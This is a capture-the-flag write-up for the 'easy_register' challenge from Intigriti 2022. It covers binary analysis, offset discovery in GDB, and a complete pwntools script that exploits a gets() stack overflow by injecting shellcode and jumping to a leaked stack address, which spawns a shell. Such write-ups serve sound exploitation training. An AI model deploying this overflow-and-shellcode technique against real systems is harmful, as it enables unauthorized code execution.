### Binary Exploitation

### Source: INTIGRITI_22

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ file easy_register 
easy_register: executable, regular file, no read permission
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ chmod +rx easy_register 
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ file easy_register 
easy_register: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ba448db2793d54d5ef48046ff85490b3b875831c, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ checksec easy_register 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/easy_register/easy_register'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Cool we're working with a x64 binary which is dynamically linked and not stripped meaning we will be able to see the function names.

The protection enabled is just PIE

With NX disabled we can inject shellcode to the stack and execute it also no canary found so if we get a stack buffer overflow we won't get stopped by stack canary

I'll run the binary to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ ./easy_register 
  _ _______________ _   _ ____  
 / |___ /___ /___  | | | |  _ \ 
 | | |_ \ |_ \  / /| | | | |_) |
 | |___) |__) |/ / | |_| |  __/ 
 |_|____/____//_/   \___/|_|    
                                
[i] Initialized attendee listing at 0x7ffe6db9a2b0.
[i] Starting registration application.

Hacker name > pwner

[+] Registration completed. Enjoy!
[+] Exiting.
```

We see it prints an likely which is likely from the stack, receives our input then exits

I'll decompile using ghidra

Here's the main function decompiled code

```
undefined8 main(void)

{
  banner();
  easy_register();
  return 0;
}
```

Nothing much happening here it just calls the banner function then the easy_register function

The banner is basically the banner

```

void banner(void)

{
  puts("\x1b[35m  _ _______________ _   _ ____  \x1b[0m");
  puts("\x1b[35m / |___ /___ /___  | | | |  _ \\ \x1b[0m");
  puts("\x1b[35m | | |_ \\ |_ \\  / /| | | | |_) |\x1b[0m");
  puts("\x1b[35m | |___) |__) |/ / | |_| |  __/ \x1b[0m");
  puts("\x1b[35m |_|____/____//_/   \\___/|_|    \x1b[0m");
  puts("\x1b[35m                                \x1b[0m");
  return;
}
```

So now i'll decompile the easy_register function

```
void easy_register(void)

{
  char input [80];
  
  printf("[\x1b[34mi\x1b[0m] Initialized attendee listing at %p.\n",input);
  puts("[\x1b[34mi\x1b[0m] Starting registration application.\n");
  printf("Hacker name > ");
  gets(input);
  puts("\n[\x1b[32m+\x1b[0m] Registration completed. Enjoy!");
  puts("[\x1b[32m+\x1b[0m] Exiting.");
  return;
}
```

Cool here's the good stuff. 

So here's what happening

```
1. It prints out the input buffer address
2. Then the prompt to register
3. Uses get() to receive the user input #bug here
3. Exits
```

Using get is vulneable to overflow cause it doesn't validate the amount of bytes it receives 

With this the input buffer can only hold up to 80 bytes of data but since it uses get i can pass in more than 80 bytes which will overflow the buffer causing a segmentation fault

Lets just get straight to this

I'll get the offset manually just for practice sake even tho i can automate my out using pwntools

Firsly i'll set a breakpoint in the easy_register func + return call

```
└─$ gdb -q easy_register        
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from easy_register...
(No debugging symbols found in easy_register)
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001070  __cxa_finalize@plt
0x0000000000001080  puts@plt
0x0000000000001090  setbuf@plt
0x00000000000010a0  printf@plt
0x00000000000010b0  gets@plt
0x00000000000010c0  _start
0x00000000000010f0  deregister_tm_clones
0x0000000000001120  register_tm_clones
0x0000000000001160  __do_global_dtors_aux
0x00000000000011a0  frame_dummy
0x00000000000011a9  setup
0x00000000000011dc  banner
0x000000000000122f  easy_register
0x000000000000129c  main
0x00000000000012c0  __libc_csu_init
0x0000000000001330  __libc_csu_fini
0x0000000000001338  _fini
gef➤  disass easy_register
Dump of assembler code for function easy_register:
   0x000000000000122f <+0>:     endbr64 
   0x0000000000001233 <+4>:     push   rbp
   0x0000000000001234 <+5>:     mov    rbp,rsp
   0x0000000000001237 <+8>:     sub    rsp,0x50
   0x000000000000123b <+12>:    lea    rax,[rbp-0x50]
   0x000000000000123f <+16>:    mov    rsi,rax
   0x0000000000001242 <+19>:    lea    rdi,[rip+0xedf]        # 0x2128
   0x0000000000001249 <+26>:    mov    eax,0x0
   0x000000000000124e <+31>:    call   0x10a0 <printf@plt>
   0x0000000000001253 <+36>:    lea    rdi,[rip+0xf06]        # 0x2160
   0x000000000000125a <+43>:    call   0x1080 <puts@plt>
   0x000000000000125f <+48>:    lea    rdi,[rip+0xf2b]        # 0x2191
   0x0000000000001266 <+55>:    mov    eax,0x0
   0x000000000000126b <+60>:    call   0x10a0 <printf@plt>
   0x0000000000001270 <+65>:    lea    rax,[rbp-0x50]
   0x0000000000001274 <+69>:    mov    rdi,rax
   0x0000000000001277 <+72>:    mov    eax,0x0
   0x000000000000127c <+77>:    call   0x10b0 <gets@plt>
   0x0000000000001281 <+82>:    lea    rdi,[rip+0xf18]        # 0x21a0
   0x0000000000001288 <+89>:    call   0x1080 <puts@plt>
   0x000000000000128d <+94>:    lea    rdi,[rip+0xf39]        # 0x21cd
   0x0000000000001294 <+101>:   call   0x1080 <puts@plt>
   0x0000000000001299 <+106>:   nop
   0x000000000000129a <+107>:   leave  
   0x000000000000129b <+108>:   ret    
End of assembler dump.
gef➤  b *easy_register+107
Breakpoint 2 at 0x129a
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/easy_register/easy_register 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  _ _______________ _   _ ____  
 / |___ /___ /___  | | | |  _ \ 
 | | |_ \ |_ \  / /| | | | |_) |
 | |___) |__) |/ / | |_| |  __/ 
 |_|____/____//_/   \___/|_|    
                                
[i] Initialized attendee listing at 0x7fffffffdd60.
[i] Starting registration application.

Hacker name > pwnerhacker

[+] Registration completed. Enjoy!
[+] Exiting.

Breakpoint 2, 0x000055555555529a in easy_register ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x16              
$rbx   : 0x007fffffffded8  →  0x007fffffffe23e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/e[...]"
$rcx   : 0x007ffff7ec10d0  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffdd60  →  "pwnerhacker"
$rbp   : 0x007fffffffddb0  →  0x007fffffffddc0  →  0x0000000000000001
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da10  →  0x0000000000000000
$rip   : 0x0055555555529a  →  <easy_register+107> leave 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007fffffffbacc  →  0xf7ffd02000000000
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdee8  →  0x007fffffffe28b  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x00555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd60│+0x0000: "pwnerhacker"  ← $rsp
0x007fffffffdd68│+0x0008: 0x007fff0072656b ("ker"?)
0x007fffffffdd70│+0x0010: 0x0000000000000000
0x007fffffffdd78│+0x0018: 0x0000000000000000
0x007fffffffdd80│+0x0020: 0x007fffffffded8  →  0x007fffffffe23e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/e[...]"
0x007fffffffdd88│+0x0028: 0x007fffffffddb0  →  0x007fffffffddc0  →  0x0000000000000001
0x007fffffffdd90│+0x0030: 0x0000000000000000
0x007fffffffdd98│+0x0038: 0x007fffffffdee8  →  0x007fffffffe28b  →  "COLORFGBG=15;0"
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55555555528d <easy_register+94> lea    rdi, [rip+0xf39]        # 0x5555555561cd
   0x555555555294 <easy_register+101> call   0x555555555080 <puts@plt>
   0x555555555299 <easy_register+106> nop    
 → 0x55555555529a <easy_register+107> leave  
   0x55555555529b <easy_register+108> ret    
   0x55555555529c <main+0>         endbr64 
   0x5555555552a0 <main+4>         push   rbp
   0x5555555552a1 <main+5>         mov    rbp, rsp
   0x5555555552a4 <main+8>         mov    eax, 0x0
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "easy_register", stopped 0x55555555529a in easy_register (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555529a → easy_register()
[#1] 0x5555555552b8 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Now i'll check for the address our input is at & the rip at that point

```
gef➤  i f
Stack level 0, frame at 0x7fffffffddc0:
 rip = 0x55555555529a in easy_register; saved rip = 0x5555555552b8
 called by frame at 0x7fffffffddd0
 Arglist at 0x7fffffffddb0, args: 
 Locals at 0x7fffffffddb0, Previous frame's sp is 0x7fffffffddc0
 Saved registers:
  rbp at 0x7fffffffddb0, rip at 0x7fffffffddb8
gef➤  search-pattern pwnerhacker
[+] Searching 'pwnerhacker' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffdd60 - 0x7fffffffdd6b  →   "pwnerhacker" 
gef➤
```

Doing the math we get the offset `0x7fffffffddb8 - 0x7fffffffdd60 = 0x58` 

Also i can use cyclic to get the offset 

First i'll generate a cyclic paatern

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ cyclic 100    
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Now i'll run the binary on gdb and give the value cyclic formed

```
└─$ gdb -q easy_register
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from easy_register...
(No debugging symbols found in easy_register)
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/easy_register/easy_register 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
  _ _______________ _   _ ____  
 / |___ /___ /___  | | | |  _ \ 
 | | |_ \ |_ \  / /| | | | |_) |
 | |___) |__) |/ / | |_| |  __/ 
 |_|____/____//_/   \___/|_|    
                                
[i] Initialized attendee listing at 0x7fffffffdd60.
[i] Starting registration application.

Hacker name > aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

[+] Registration completed. Enjoy!
[+] Exiting.

Program received signal SIGSEGV, Segmentation fault.
0x000055555555529b in easy_register ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x16              
$rbx   : 0x007fffffffded8  →  0x007fffffffe23e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/e[...]"
$rcx   : 0x007ffff7ec10d0  →  0x5877fffff0003d48 ("H="?)
$rdx   : 0x1               
$rsp   : 0x007fffffffddb8  →  "waaaxaaayaaa"
$rbp   : 0x6161617661616175 ("uaaavaaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da10  →  0x0000000000000000
$rip   : 0x0055555555529b  →  <easy_register+108> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007fffffffbacc  →  0xf7ffd02000000000
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdee8  →  0x007fffffffe28b  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x00555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffddb8│+0x0000: "waaaxaaayaaa"         ← $rsp
0x007fffffffddc0│+0x0008: 0x00000061616179 ("yaaa"?)
0x007fffffffddc8│+0x0010: 0x007ffff7df018a  →  <__libc_start_call_main+122> mov edi, eax
0x007fffffffddd0│+0x0018: 0x007ffff7f985e0  →  0x0000000000000000
0x007fffffffddd8│+0x0020: 0x0055555555529c  →  <main+0> endbr64 
0x007fffffffdde0│+0x0028: 0x00000001f7f9ba80
0x007fffffffdde8│+0x0030: 0x007fffffffded8  →  0x007fffffffe23e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/e[...]"
0x007fffffffddf0│+0x0038: 0x007fffffffded8  →  0x007fffffffe23e  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/e[...]"
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555294 <easy_register+101> call   0x555555555080 <puts@plt>
   0x555555555299 <easy_register+106> nop    
   0x55555555529a <easy_register+107> leave  
 → 0x55555555529b <easy_register+108> ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "easy_register", stopped 0x55555555529b in easy_register (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555529b → easy_register()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

So i'll get the offset from taking the first 4 btyes in the $rsp and using cyclic offset 

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ cyclic -l waaa
88
```

So we see its the same offset `0x58 == 88`

With this i'll write the exploit code

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Binary filename
exe = './easy_register'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

# Extract the leak address
io.recvlines(6)
stack_addr = int(re.search(r"(0x[\w\d]+)", io.recvlineS()).group(0), 16)
info("Leaked stack addrress: %#x", stack_addr)

# Shellcode
shellcode = asm(shellcraft.popad())
shellcode += asm(shellcraft.sh())

padding = asm('nop') * (offset - len(shellcode))

# Build the payload
payload = flat([
	shellcode,
	padding,
	stack_addr
    ])

# Send the payload
io.sendlineafter(b'>', payload)

# Got Shell?
io.interactive()
```

So this the exploit code and what it does is this

```
1. Gets the offset (we know it already tho 😑)
2. Extracts the leaked stack address
3. Creates the shellcode
4. Makes the padding
5. Build the payload i.e shellcode + padding + stack_addr
6. Sends the payload
```

Running it we get shell

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/easy_register]
└─$ python2 exploit.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[+] Starting local process './easy_register': pid 146495
[*] Process './easy_register' stopped with exit code -11 (SIGSEGV) (pid 146495)
[+] Parsing corefile...: Done
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/easy_register/core.146495'
    Arch:      amd64-64-little
    RIP:       0x5608e0d0229b
    RSP:       0x7ffde9398938
    Exe:       '/home/mark/Documents/Pentest/BOF/03-begineer_bof/easy_register/easy_register' (0x5608e0d01000)
    Fault:     0x6161617861616177
[!] located EIP/RIP offset at 88
[+] Starting local process './easy_register': pid 146502
[*] Leaked stack addrress: 0x7ffed0d020a0
[*] Switching to interactive mode
 
[+] Registration completed. Enjoy!
[+] Exiting.
$ ls -al
total 2368
drwxr-xr-x  2 mark mark    4096 Feb  5 21:48 .
drwxr-xr-x 24 mark mark    4096 Feb  5 21:14 ..
-rw-r--r--  1 mark mark 2392064 Feb  5 21:48 core.146495
-r-xr-xr-x  1 mark mark   17008 Feb  5 21:14 easy_register
-rw-r--r--  1 mark mark    1859 Feb  5 21:48 exploit.py
$ whoami
mark
$
```

And we're done 

<br> <br>
[Back To Home](../../index.md)

                                   
